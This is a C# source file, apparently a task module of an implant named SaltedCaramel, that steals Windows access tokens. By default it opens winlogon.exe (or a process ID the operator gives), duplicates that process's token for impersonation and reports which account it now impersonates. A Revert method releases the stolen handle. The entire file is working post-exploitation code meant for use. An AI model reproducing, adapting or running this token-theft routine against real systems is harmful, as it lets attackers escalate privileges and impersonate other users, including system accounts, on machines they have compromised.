using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SaltedCaramel.Tasks
{
    public class Token
    {
        public static IntPtr stolenHandle;

        public static void Execute(SCTaskObject task)
        {
            try
            {
                int procId;
                IntPtr procHandle;
                if (task.@params == "")
                {
                    Process winlogon = Process.GetProcessesByName("winlogon")[0];
                    procHandle = winlogon.Handle;
                    Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
                }
                else
                {
                    procId = Convert.ToInt32(task.@params);
                    procHandle = Process.GetProcessById(procId).Handle;
                    Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
                }

                try
                {
                    // Stores the handle for the original process token
                    stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token

                    // Get handle to target process token
                    bool procToken = Win32.OpenProcessToken(
                        procHandle,                                 // ProcessHandle
                        (uint)TokenAccessLevels.MaximumAllowed,     // desiredAccess
                        out IntPtr tokenHandle);                           // TokenHandle

                    if (!procToken) // Check if OpenProcessToken was successful
                        throw new Exception(Marshal.GetLastWin32Error().ToString());

                    Debug.WriteLine("[+] StealToken - OpenProcessToken: " + procToken);

                    try
                    {
                        // Duplicate token as stolenHandle
                        bool duplicateToken = Win32.DuplicateTokenEx(
                            tokenHandle,                                    // hExistingToken
                            (uint)TokenAccessLevels.MaximumAllowed,         // dwDesiredAccess
                            IntPtr.Zero,                                    // lpTokenAttributes
                            (uint)TokenImpersonationLevel.Impersonation,    // ImpersonationLevel
                            Win32.TOKEN_TYPE.TokenImpersonation,            // TokenType
                            out stolenHandle);                              // phNewToken

                        if (!duplicateToken) // Check if DuplicateTokenEx was successful
                            throw new Exception(Marshal.GetLastWin32Error().ToString());

                        Debug.WriteLine("[+] StealToken - DuplicateTokenEx: " + duplicateToken);

                        WindowsIdentity ident = new WindowsIdentity(stolenHandle);
                        Debug.WriteLine("[+] StealToken - Successfully impersonated " + ident.Name);
                        Win32.CloseHandle(tokenHandle);
                        Win32.CloseHandle(procHandle);

                        task.status = "complete";
                        task.message = "Successfully impersonated " + ident.Name;
                        ident.Dispose();
                    }
                    catch (Exception e) // Catch errors thrown by DuplicateTokenEx
                    {
                        Debug.WriteLine("[!] StealToken - ERROR duplicating token: " + e.Message);
                        task.status = "error";
                        task.message = e.Message;
                    }
                }
                catch (Exception e) // Catch errors thrown by OpenProcessToken
                {
                    Debug.WriteLine("[!] StealToken - ERROR creating token handle: " + e.Message);
                    task.status = "error";
                    task.message = e.Message;
                }
            }
            catch (Exception e) // Catch errors thrown by Process.GetProcessById
            {
                Debug.WriteLine("[!] StealToken - ERROR creating process handle: " + e.Message);
                task.status = "error";
                task.message = e.Message;
            }

        }

        public static void Revert(SCTaskObject task, SCImplant implant)
        {
            Win32.CloseHandle(stolenHandle);
            stolenHandle = IntPtr.Zero;
            task.status = "complete";
        }
    }
}